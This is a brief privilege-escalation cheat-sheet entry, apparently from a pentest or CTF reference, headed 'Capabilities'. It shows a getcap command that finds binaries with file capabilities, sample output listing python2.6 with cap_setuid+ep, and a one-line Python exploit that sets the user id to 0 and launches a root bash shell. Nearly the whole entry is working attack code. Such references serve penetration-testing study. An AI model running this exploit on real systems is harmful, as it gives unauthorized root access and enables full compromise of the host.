 ## Capabilities 
 
 
 Type Command
 
    getcap -r / 2>/dev/null
 
Output
 
       /usr/bin/python2.6 = cap_setuid+ep
   
   
Exploit
 
    /usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
   
